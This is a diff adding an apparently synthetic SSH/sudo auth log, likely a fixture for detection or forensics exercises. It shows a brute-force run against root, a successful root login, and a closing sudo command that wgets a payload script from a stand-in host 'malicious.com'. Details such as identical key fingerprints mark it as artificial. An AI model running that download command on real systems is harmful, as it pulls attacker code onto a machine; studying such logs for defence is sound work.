@@ -1,0 +1,339 @@
+Nov 01 00:00:11 webserver01 sshd[1004]: Accepted publickey for git from 103.21.244.10 port 47228 ssh2: RSA SHA256:abc123def456
+Nov 01 00:00:11 webserver01 sshd[1004]: pam_unix(sshd:session): session opened for user git by (uid=0)
+Nov 01 00:00:29 webserver01 sshd[1007]: Accepted publickey for alice from 14.139.123.45 port 48828 ssh2: RSA SHA256:abc123def456
+Nov 01 00:00:29 webserver01 sshd[1007]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Nov 01 00:01:07 webserver01 sshd[1010]: Accepted publickey for deploy from 14.139.123.45 port 53984 ssh2: RSA SHA256:abc123def456
+Nov 01 00:01:07 webserver01 sshd[1010]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Nov 01 00:01:47 webserver01 sshd[1014]: Accepted publickey for frank from 14.139.123.45 port 44964 ssh2: RSA SHA256:abc123def456
+Nov 01 00:01:47 webserver01 sshd[1014]: pam_unix(sshd:session): session opened for user frank by (uid=0)
+Nov 01 00:02:12 webserver01 sshd[1017]: Accepted publickey for git from 49.36.78.145 port 62130 ssh2: RSA SHA256:abc123def456
+Nov 01 00:02:12 webserver01 sshd[1017]: pam_unix(sshd:session): session opened for user git by (uid=0)
+Nov 01 00:02:57 webserver01 sshd[1021]: Accepted publickey for alice from 103.21.244.10 port 44303 ssh2: RSA SHA256:abc123def456
+Nov 01 00:02:57 webserver01 sshd[1021]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Nov 01 00:03:32 webserver01 sshd[1026]: Accepted publickey for git from 103.21.244.10 port 60581 ssh2: RSA SHA256:abc123def456
+Nov 01 00:03:32 webserver01 sshd[1026]: pam_unix(sshd:session): session opened for user git by (uid=0)
+Nov 01 00:04:06 webserver01 sshd[1029]: Accepted publickey for frank from 49.36.78.145 port 48650 ssh2: RSA SHA256:abc123def456
+Nov 01 00:04:06 webserver01 sshd[1029]: pam_unix(sshd:session): session opened for user frank by (uid=0)
+Nov 01 00:04:13 webserver01 sshd[1033]: Accepted publickey for frank from 14.139.123.45 port 46790 ssh2: RSA SHA256:abc123def456
+Nov 01 00:04:13 webserver01 sshd[1033]: pam_unix(sshd:session): session opened for user frank by (uid=0)
+Nov 01 00:04:55 webserver01 sshd[1034]: Accepted publickey for bob from 49.36.78.145 port 58195 ssh2: RSA SHA256:abc123def456
+Nov 01 00:04:55 webserver01 sshd[1034]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Nov 01 00:05:04 webserver01 sshd[1038]: Accepted publickey for alice from 106.51.23.89 port 48627 ssh2: RSA SHA256:abc123def456
+Nov 01 00:05:04 webserver01 sshd[1038]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Nov 01 00:05:31 webserver01 sshd[1043]: Accepted publickey for frank from 49.36.78.145 port 51540 ssh2: RSA SHA256:abc123def456
+Nov 01 00:05:31 webserver01 sshd[1043]: pam_unix(sshd:session): session opened for user frank by (uid=0)
+Nov 01 00:05:55 webserver01 sshd[1046]: Accepted publickey for git from 106.51.23.89 port 64424 ssh2: RSA SHA256:abc123def456
+Nov 01 00:05:55 webserver01 sshd[1046]: pam_unix(sshd:session): session opened for user git by (uid=0)
+Nov 01 00:06:38 webserver01 sshd[1048]: Accepted publickey for git from 157.32.18.201 port 40942 ssh2: RSA SHA256:abc123def456
+Nov 01 00:06:38 webserver01 sshd[1048]: pam_unix(sshd:session): session opened for user git by (uid=0)
+Nov 01 00:07:10 webserver01 sshd[1049]: Accepted publickey for deploy from 106.51.23.89 port 47314 ssh2: RSA SHA256:abc123def456
+Nov 01 00:07:10 webserver01 sshd[1049]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Nov 01 00:07:43 webserver01 sshd[1051]: pam_unix(sshd:session): session closed for user alice
+Nov 01 00:07:43 webserver01 sshd[1051]: Disconnected from user alice 157.32.18.201 port 60704
+Nov 01 00:08:21 webserver01 sshd[1052]: pam_unix(sshd:session): session closed for user bob
+Nov 01 00:08:21 webserver01 sshd[1052]: Disconnected from user bob 14.139.123.45 port 50240
+Nov 01 00:08:57 webserver01 sshd[1055]: pam_unix(sshd:session): session closed for user deploy
+Nov 01 00:08:57 webserver01 sshd[1055]: Disconnected from user deploy 106.51.23.89 port 62744
+Nov 01 00:09:16 webserver01 sshd[1057]: pam_unix(sshd:session): session closed for user deploy
+Nov 01 00:09:16 webserver01 sshd[1057]: Disconnected from user deploy 106.51.23.89 port 58900
+Nov 01 00:09:22 webserver01 sshd[1060]: pam_unix(sshd:session): session closed for user deploy
+Nov 01 00:09:22 webserver01 sshd[1060]: Disconnected from user deploy 103.21.244.10 port 59457
+Nov 01 00:09:48 webserver01 sshd[1062]: pam_unix(sshd:session): session closed for user deploy
+Nov 01 00:09:48 webserver01 sshd[1062]: Disconnected from user deploy 157.32.18.201 port 63476
+Nov 01 00:09:55 webserver01 sshd[1065]: pam_unix(sshd:session): session closed for user frank
+Nov 01 00:09:55 webserver01 sshd[1065]: Disconnected from user frank 106.51.23.89 port 48818
+Nov 01 00:10:36 webserver01 sshd[1066]: pam_unix(sshd:session): session closed for user git
+Nov 01 00:10:36 webserver01 sshd[1066]: Disconnected from user git 103.21.244.10 port 44553
+Nov 01 00:11:04 webserver01 sshd[1071]: pam_unix(sshd:session): session closed for user deploy
+Nov 01 00:11:04 webserver01 sshd[1071]: Disconnected from user deploy 103.21.244.10 port 53518
+Nov 01 00:11:32 webserver01 sshd[1076]: pam_unix(sshd:session): session closed for user frank
+Nov 01 00:11:32 webserver01 sshd[1076]: Disconnected from user frank 14.139.123.45 port 52880
+Nov 01 00:11:57 webserver01 sshd[1078]: Failed password for deploy from 14.139.123.45 port 50643 ssh2
+Nov 01 00:11:57 webserver01 sshd[1078]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45 user=deploy
+Nov 01 00:12:24 webserver01 sshd[1083]: Failed password for frank from 14.139.123.45 port 48056 ssh2
+Nov 01 00:12:24 webserver01 sshd[1083]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45 user=frank
+Nov 01 00:12:43 webserver01 sshd[1085]: Failed password for git from 49.36.78.145 port 49034 ssh2
+Nov 01 00:12:43 webserver01 sshd[1085]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145 user=git
+Nov 01 00:12:56 webserver01 sshd[1087]: Failed password for frank from 157.32.18.201 port 54894 ssh2
+Nov 01 00:12:56 webserver01 sshd[1087]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=157.32.18.201 user=frank
+Nov 01 00:12:59 webserver01 sshd[1088]: Failed password for deploy from 157.32.18.201 port 59073 ssh2
+Nov 01 00:12:59 webserver01 sshd[1088]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=157.32.18.201 user=deploy
+Nov 01 00:13:03 webserver01 sshd[1093]: Failed password for deploy from 14.139.123.45 port 61779 ssh2
+Nov 01 00:13:03 webserver01 sshd[1093]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45 user=deploy
+Nov 01 00:13:39 webserver01 sshd[1094]: Failed password for alice from 106.51.23.89 port 40735 ssh2
+Nov 01 00:13:39 webserver01 sshd[1094]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=106.51.23.89 user=alice
+Nov 01 00:13:51 webserver01 sshd[1099]: Failed password for bob from 157.32.18.201 port 53432 ssh2
+Nov 01 00:13:51 webserver01 sshd[1099]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=157.32.18.201 user=bob
+Nov 01 00:14:20 webserver01 sudo[1104]:     deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl reload nginx
+Nov 01 00:14:20 webserver01 sudo[1104]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)
+Nov 01 00:14:20 webserver01 sudo[1104]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:14:28 webserver01 sudo[1107]:     frank : TTY=pts/2 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/docker ps
+Nov 01 00:14:28 webserver01 sudo[1107]: pam_unix(sudo:session): session opened for user root by frank(uid=1000)
+Nov 01 00:14:28 webserver01 sudo[1107]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:14:55 webserver01 sudo[1109]:     frank : TTY=pts/2 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
+Nov 01 00:14:55 webserver01 sudo[1109]: pam_unix(sudo:session): session opened for user root by frank(uid=1005)
+Nov 01 00:14:55 webserver01 sudo[1109]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:14:59 webserver01 sudo[1111]:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
+Nov 01 00:14:59 webserver01 sudo[1111]: pam_unix(sudo:session): session opened for user root by alice(uid=1002)
+Nov 01 00:14:59 webserver01 sudo[1111]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:15:10 webserver01 sudo[1113]:     git : TTY=pts/2 ; PWD=/home/git ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+Nov 01 00:15:10 webserver01 sudo[1113]: pam_unix(sudo:session): session opened for user root by git(uid=1004)
+Nov 01 00:15:10 webserver01 sudo[1113]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:15:47 webserver01 sudo[1117]:     bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/systemctl reload nginx
+Nov 01 00:15:47 webserver01 sudo[1117]: pam_unix(sudo:session): session opened for user root by bob(uid=1000)
+Nov 01 00:15:47 webserver01 sudo[1117]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:15:52 webserver01 sudo[1121]:     frank : TTY=pts/1 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
+Nov 01 00:15:52 webserver01 sudo[1121]: pam_unix(sudo:session): session opened for user root by frank(uid=1005)
+Nov 01 00:15:52 webserver01 sudo[1121]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:16:15 webserver01 sudo[1123]:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
+Nov 01 00:16:15 webserver01 sudo[1123]: pam_unix(sudo:session): session opened for user root by alice(uid=1005)
+Nov 01 00:16:15 webserver01 sudo[1123]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:16:47 webserver01 sudo[1127]:     git : TTY=pts/1 ; PWD=/home/git ; USER=root ; COMMAND=/usr/bin/docker ps
+Nov 01 00:16:47 webserver01 sudo[1127]: pam_unix(sudo:session): session opened for user root by git(uid=1004)
+Nov 01 00:16:47 webserver01 sudo[1127]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:17:19 webserver01 sudo[1132]:     deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 01 00:17:19 webserver01 sudo[1132]: pam_unix(sudo:session): session opened for user root by deploy(uid=1003)
+Nov 01 00:17:19 webserver01 sudo[1132]: pam_unix(sudo:session): session closed for user root
+Nov 01 00:17:51 webserver01 sshd[1137]: Failed password for root from 185.220.101.34 port 62126 ssh2
+Nov 01 00:17:51 webserver01 sshd[1137]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:18:30 webserver01 sshd[1141]: Failed password for root from 185.220.101.34 port 40931 ssh2
+Nov 01 00:18:30 webserver01 sshd[1141]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:19:03 webserver01 sshd[1143]: Failed password for root from 185.220.101.34 port 43404 ssh2
+Nov 01 00:19:03 webserver01 sshd[1143]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:19:44 webserver01 sshd[1147]: Failed password for root from 185.220.101.34 port 44906 ssh2
+Nov 01 00:19:44 webserver01 sshd[1147]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:19:56 webserver01 sshd[1148]: Failed password for root from 185.220.101.34 port 60148 ssh2
+Nov 01 00:19:56 webserver01 sshd[1148]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:20:23 webserver01 sshd[1153]: Failed password for root from 185.220.101.34 port 42780 ssh2
+Nov 01 00:20:23 webserver01 sshd[1153]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:21:04 webserver01 sshd[1155]: Failed password for root from 185.220.101.34 port 44655 ssh2
+Nov 01 00:21:04 webserver01 sshd[1155]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:21:38 webserver01 sshd[1156]: Failed password for root from 185.220.101.34 port 64310 ssh2
+Nov 01 00:21:38 webserver01 sshd[1156]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:22:08 webserver01 sshd[1159]: Failed password for root from 185.220.101.34 port 55539 ssh2
+Nov 01 00:22:08 webserver01 sshd[1159]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:22:32 webserver01 sshd[1161]: Failed password for root from 185.220.101.34 port 45294 ssh2
+Nov 01 00:22:32 webserver01 sshd[1161]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:23:13 webserver01 sshd[1166]: Failed password for root from 185.220.101.34 port 41121 ssh2
+Nov 01 00:23:13 webserver01 sshd[1166]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:23:43 webserver01 sshd[1171]: Failed password for root from 185.220.101.34 port 40521 ssh2
+Nov 01 00:23:43 webserver01 sshd[1171]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:23:52 webserver01 sshd[1174]: Failed password for root from 185.220.101.34 port 51511 ssh2
+Nov 01 00:23:52 webserver01 sshd[1174]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:24:24 webserver01 sshd[1177]: Failed password for root from 185.220.101.34 port 53217 ssh2
+Nov 01 00:24:24 webserver01 sshd[1177]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:24:58 webserver01 sshd[1182]: Failed password for root from 185.220.101.34 port 62170 ssh2
+Nov 01 00:24:58 webserver01 sshd[1182]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:25:13 webserver01 sshd[1186]: Failed password for root from 185.220.101.34 port 51518 ssh2
+Nov 01 00:25:13 webserver01 sshd[1186]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:25:15 webserver01 sshd[1187]: Failed password for root from 185.220.101.34 port 57581 ssh2
+Nov 01 00:25:15 webserver01 sshd[1187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:25:30 webserver01 sshd[1192]: Failed password for root from 185.220.101.34 port 51990 ssh2
+Nov 01 00:25:30 webserver01 sshd[1192]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:25:34 webserver01 sshd[1195]: Failed password for root from 185.220.101.34 port 60129 ssh2
+Nov 01 00:25:34 webserver01 sshd[1195]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:26:08 webserver01 sshd[1200]: Failed password for root from 185.220.101.34 port 58112 ssh2
+Nov 01 00:26:08 webserver01 sshd[1200]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:26:48 webserver01 sshd[1204]: Failed password for root from 185.220.101.34 port 52458 ssh2
+Nov 01 00:26:48 webserver01 sshd[1204]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:26:55 webserver01 sshd[1205]: Failed password for root from 185.220.101.34 port 58949 ssh2
+Nov 01 00:26:55 webserver01 sshd[1205]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:26:58 webserver01 sshd[1208]: Failed password for root from 185.220.101.34 port 52484 ssh2
+Nov 01 00:26:58 webserver01 sshd[1208]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:27:43 webserver01 sshd[1209]: Failed password for root from 185.220.101.34 port 41976 ssh2
+Nov 01 00:27:43 webserver01 sshd[1209]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:27:45 webserver01 sshd[1214]: Failed password for root from 185.220.101.34 port 48759 ssh2
+Nov 01 00:27:45 webserver01 sshd[1214]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:28:20 webserver01 sshd[1219]: Failed password for root from 185.220.101.34 port 45940 ssh2
+Nov 01 00:28:20 webserver01 sshd[1219]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:29:04 webserver01 sshd[1220]: Failed password for root from 185.220.101.34 port 64739 ssh2
+Nov 01 00:29:04 webserver01 sshd[1220]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:29:25 webserver01 sshd[1225]: Failed password for root from 185.220.101.34 port 55881 ssh2
+Nov 01 00:29:25 webserver01 sshd[1225]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:29:29 webserver01 sshd[1228]: Failed password for root from 185.220.101.34 port 58326 ssh2
+Nov 01 00:29:29 webserver01 sshd[1228]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:29:39 webserver01 sshd[1229]: Failed password for root from 185.220.101.34 port 47198 ssh2
+Nov 01 00:29:39 webserver01 sshd[1229]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:30:11 webserver01 sshd[1234]: Failed password for root from 185.220.101.34 port 57477 ssh2
+Nov 01 00:30:11 webserver01 sshd[1234]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:30:40 webserver01 sshd[1239]: Failed password for root from 185.220.101.34 port 52756 ssh2
+Nov 01 00:30:40 webserver01 sshd[1239]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:31:18 webserver01 sshd[1244]: Failed password for root from 185.220.101.34 port 59171 ssh2
+Nov 01 00:31:18 webserver01 sshd[1244]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:31:42 webserver01 sshd[1249]: Failed password for root from 185.220.101.34 port 41234 ssh2
+Nov 01 00:31:42 webserver01 sshd[1249]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:32:08 webserver01 sshd[1251]: Failed password for root from 185.220.101.34 port 49327 ssh2
+Nov 01 00:32:08 webserver01 sshd[1251]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:32:44 webserver01 sshd[1252]: Failed password for root from 185.220.101.34 port 46418 ssh2
+Nov 01 00:32:44 webserver01 sshd[1252]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:32:53 webserver01 sshd[1254]: Failed password for root from 185.220.101.34 port 54857 ssh2
+Nov 01 00:32:53 webserver01 sshd[1254]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:33:29 webserver01 sshd[1257]: Failed password for root from 185.220.101.34 port 50551 ssh2
+Nov 01 00:33:29 webserver01 sshd[1257]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:33:59 webserver01 sshd[1258]: Failed password for root from 185.220.101.34 port 49703 ssh2
+Nov 01 00:33:59 webserver01 sshd[1258]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:34:28 webserver01 sshd[1263]: Failed password for root from 185.220.101.34 port 63011 ssh2
+Nov 01 00:34:28 webserver01 sshd[1263]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
+Nov 01 00:34:33 webserver01 sshd[1266]: Failed password for root from 185.220.101.34 port 44038 ssh2
+Nov 01 00:34:52 webserver01 sshd[1270]: Failed password for root from 185.220.101.34 port 47190 ssh2
+Nov 01 00:35:05 webserver01 sshd[1273]: Failed password for root from 185.220.101.34 port 55029 ssh2
+Nov 01 00:35:42 webserver01 sshd[1278]: Failed password for root from 185.220.101.34 port 60347 ssh2
+Nov 01 00:35:50 webserver01 sshd[1283]: Failed password for root from 185.220.101.34 port 47290 ssh2
+Nov 01 00:36:22 webserver01 sshd[1287]: Failed password for root from 185.220.101.34 port 50559 ssh2
+Nov 01 00:36:32 webserver01 sshd[1292]: Failed password for root from 185.220.101.34 port 64716 ssh2
+Nov 01 00:37:03 webserver01 sshd[1294]: Failed password for root from 5.188.86.172 port 48584 ssh2
+Nov 01 00:37:28 webserver01 sshd[1299]: Failed password for root from 5.188.86.172 port 53719 ssh2
+Nov 01 00:37:57 webserver01 sshd[1304]: Failed password for root from 5.188.86.172 port 54805 ssh2
+Nov 01 00:38:25 webserver01 sshd[1309]: Failed password for root from 5.188.86.172 port 59062 ssh2
+Nov 01 00:38:28 webserver01 sshd[1314]: Failed password for root from 5.188.86.172 port 61671 ssh2
+Nov 01 00:38:56 webserver01 sshd[1316]: Failed password for root from 5.188.86.172 port 60351 ssh2
+Nov 01 00:39:39 webserver01 sshd[1317]: Failed password for root from 5.188.86.172 port 43812 ssh2
+Nov 01 00:40:18 webserver01 sshd[1319]: Failed password for root from 5.188.86.172 port 48188 ssh2
+Nov 01 00:40:29 webserver01 sshd[1323]: Failed password for root from 5.188.86.172 port 51508 ssh2
+Nov 01 00:40:38 webserver01 sshd[1326]: Failed password for root from 5.188.86.172 port 45304 ssh2
+Nov 01 00:41:00 webserver01 sshd[1328]: Failed password for root from 5.188.86.172 port 48096 ssh2
+Nov 01 00:41:44 webserver01 sshd[1331]: Failed password for root from 5.188.86.172 port 49909 ssh2
+Nov 01 00:42:08 webserver01 sshd[1334]: Failed password for root from 222.186.42.117 port 46962 ssh2
+Nov 01 00:42:38 webserver01 sshd[1338]: Failed password for root from 222.186.42.117 port 45778 ssh2
+Nov 01 00:43:08 webserver01 sshd[1342]: Failed password for root from 222.186.42.117 port 41371 ssh2
+Nov 01 00:43:11 webserver01 sshd[1344]: Failed password for root from 222.186.42.117 port 50630 ssh2
+Nov 01 00:43:20 webserver01 sshd[1345]: Failed password for root from 222.186.42.117 port 40921 ssh2
+Nov 01 00:43:55 webserver01 sshd[1349]: Failed password for root from 222.186.42.117 port 62801 ssh2
+Nov 01 00:44:22 webserver01 sshd[1354]: Failed password for root from 222.186.42.117 port 44666 ssh2
+Nov 01 00:45:00 webserver01 sshd[1358]: Failed password for root from 222.186.42.117 port 42389 ssh2
+Nov 01 00:45:26 webserver01 sshd[1360]: Failed password for root from 222.186.42.117 port 64359 ssh2
+Nov 01 00:45:46 webserver01 sshd[1361]: Failed password for root from 194.165.16.11 port 40197 ssh2
+Nov 01 00:45:58 webserver01 sshd[1365]: Failed password for root from 194.165.16.11 port 40736 ssh2
+Nov 01 00:46:01 webserver01 sshd[1366]: Failed password for root from 194.165.16.11 port 52647 ssh2
+Nov 01 00:46:28 webserver01 sshd[1368]: Failed password for root from 194.165.16.11 port 58841 ssh2
+Nov 01 00:47:10 webserver01 sshd[1371]: Failed password for root from 194.165.16.11 port 64474 ssh2
+Nov 01 00:47:21 webserver01 sshd[1374]: Failed password for root from 194.165.16.11 port 57073 ssh2
+Nov 01 00:47:46 webserver01 sshd[1377]: Failed password for root from 194.165.16.11 port 59536 ssh2
+Nov 01 00:48:06 webserver01 sshd[1381]: Failed password for root from 194.165.16.11 port 64466 ssh2
+Nov 01 00:48:28 webserver01 sshd[1383]: Failed password for root from 194.165.16.11 port 54901 ssh2
+Nov 01 00:49:03 webserver01 sshd[1388]: Failed password for root from 194.165.16.11 port 60080 ssh2
+Nov 01 00:49:33 webserver01 sshd[1391]: Failed password for root from 45.95.168.189 port 43861 ssh2
+Nov 01 00:50:02 webserver01 sshd[1392]: Failed password for root from 45.95.168.189 port 48798 ssh2
+Nov 01 00:50:23 webserver01 sshd[1393]: Failed password for root from 45.95.168.189 port 43881 ssh2
+Nov 01 00:50:43 webserver01 sshd[1394]: Failed password for root from 45.95.168.189 port 49606 ssh2
+Nov 01 00:51:16 webserver01 sshd[1398]: Failed password for root from 45.95.168.189 port 61001 ssh2
+Nov 01 00:51:43 webserver01 sshd[1402]: Failed password for root from 45.95.168.189 port 51574 ssh2
+Nov 01 00:51:53 webserver01 sshd[1404]: Failed password for root from 45.95.168.189 port 46457 ssh2
+Nov 01 00:52:02 webserver01 sshd[1408]: Failed password for root from 45.95.168.189 port 49035 ssh2
+Nov 01 00:52:20 webserver01 sshd[1409]: Failed password for root from 45.95.168.189 port 54060 ssh2
+Nov 01 00:52:25 webserver01 sshd[1412]: Failed password for root from 45.95.168.189 port 51109 ssh2
+Nov 01 00:52:54 webserver01 sshd[1415]: Failed password for root from 45.95.168.189 port 64750 ssh2
+Nov 01 00:53:28 webserver01 sshd[1417]: Invalid user admin from 89.248.167.131 port 45223
+Nov 01 00:53:28 webserver01 sshd[1417]: Connection closed by invalid user admin 89.248.167.131 port 45223 [preauth]
+Nov 01 00:53:43 webserver01 sshd[1418]: Invalid user test from 89.248.167.131 port 61859
+Nov 01 00:53:43 webserver01 sshd[1418]: Connection closed by invalid user test 89.248.167.131 port 61859 [preauth]
+Nov 01 00:53:48 webserver01 sshd[1419]: Invalid user guest from 89.248.167.131 port 47633
+Nov 01 00:53:48 webserver01 sshd[1419]: Connection closed by invalid user guest 89.248.167.131 port 47633 [preauth]
+Nov 01 00:54:13 webserver01 sshd[1421]: Invalid user oracle from 89.248.167.131 port 61634
+Nov 01 00:54:13 webserver01 sshd[1421]: Connection closed by invalid user oracle 89.248.167.131 port 61634 [preauth]
+Nov 01 00:54:36 webserver01 sshd[1424]: Invalid user ubuntu from 89.248.167.131 port 48341
+Nov 01 00:54:36 webserver01 sshd[1424]: Connection closed by invalid user ubuntu 89.248.167.131 port 48341 [preauth]
+Nov 01 00:54:40 webserver01 sshd[1425]: Invalid user pi from 89.248.167.131 port 62077
+Nov 01 00:54:40 webserver01 sshd[1425]: Connection closed by invalid user pi 89.248.167.131 port 62077 [preauth]
+Nov 01 00:55:21 webserver01 sshd[1427]: Invalid user user from 89.248.167.131 port 45556
+Nov 01 00:55:21 webserver01 sshd[1427]: Connection closed by invalid user user 89.248.167.131 port 45556 [preauth]
+Nov 01 00:55:28 webserver01 sshd[1429]: Invalid user support from 89.248.167.131 port 44902
+Nov 01 00:55:28 webserver01 sshd[1429]: Connection closed by invalid user support 89.248.167.131 port 44902 [preauth]
+Nov 01 00:55:43 webserver01 sshd[1431]: Invalid user ftpuser from 89.248.167.131 port 43588
+Nov 01 00:55:43 webserver01 sshd[1431]: Connection closed by invalid user ftpuser 89.248.167.131 port 43588 [preauth]
+Nov 01 00:55:53 webserver01 sshd[1436]: Accepted password for root from 185.220.101.34 port 61400 ssh2
+Nov 01 00:55:53 webserver01 sshd[1436]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Nov 01 00:56:08 webserver01 sudo[1438]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+Nov 01 00:56:36 webserver01 sudo[1439]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious.com/payload.sh
